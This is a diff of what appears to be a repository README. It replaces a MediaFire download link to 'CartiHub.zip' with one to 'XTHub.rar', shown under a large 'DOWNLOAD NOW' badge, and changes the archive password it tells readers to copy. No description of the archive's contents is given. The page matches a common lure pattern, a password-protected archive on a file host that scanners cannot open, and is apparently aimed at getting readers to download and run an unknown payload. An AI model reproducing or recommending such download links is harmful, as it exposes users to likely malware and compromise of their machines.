@@ -3,7 +3,7 @@
 
 <div align="center">
   <br>
-  <a href="https://download2278.mediafire.com/366xhx9mrnlg0IFheB0EPEjxt5aGT-itFJTHOlVdADPS9jcf6zrf3f6fL3owQ8xyR3Fubhfmzfo_8xxyMnaIjLESMaBSE-jGA-1pBhqPixy6gHlchSR2AJneM_wkbDByjs7WFSH0GM9eK4ateQPN_k-V4ymXznhq5pq3aHvChfU/dshtoi07wccv3xx/CartiHub.zip">
+  <a href="https://download1592.mediafire.com/yb8x7q4a24bgh5kb27hpuPPBoOo1cOoQh2jpU-GSG47_8iKk0rqqMM5S38-vsUp77gMwrPhA-sssbqblIse36K1zhAz1Hnsn0A3y-9X8GvsRtD5dBOtRgyCL-z8hzQQ9TDnDZoTdnp2SeqTJkYw8eQSEDKyK9e6HrYx7LzvmkykxrDU/t10wxz23bafpo3x/XTHub.rar">
     <img src="https://img.shields.io/badge/DOWNLOAD%20NOW-8B5CF6?style=for-the-badge&logo=FREE&logoColor=white"
          width="350"
          height="80"
@@ -16,7 +16,7 @@
 
 <h2>🔐 PASSWORD ARCHIVE</h2>
 
-<h1><code>CARTI2026</code></h1>
+<h1><code>AA2026</code></h1>
 
 **📋 Click the code to select the password, then copy it with Ctrl + C.**
 
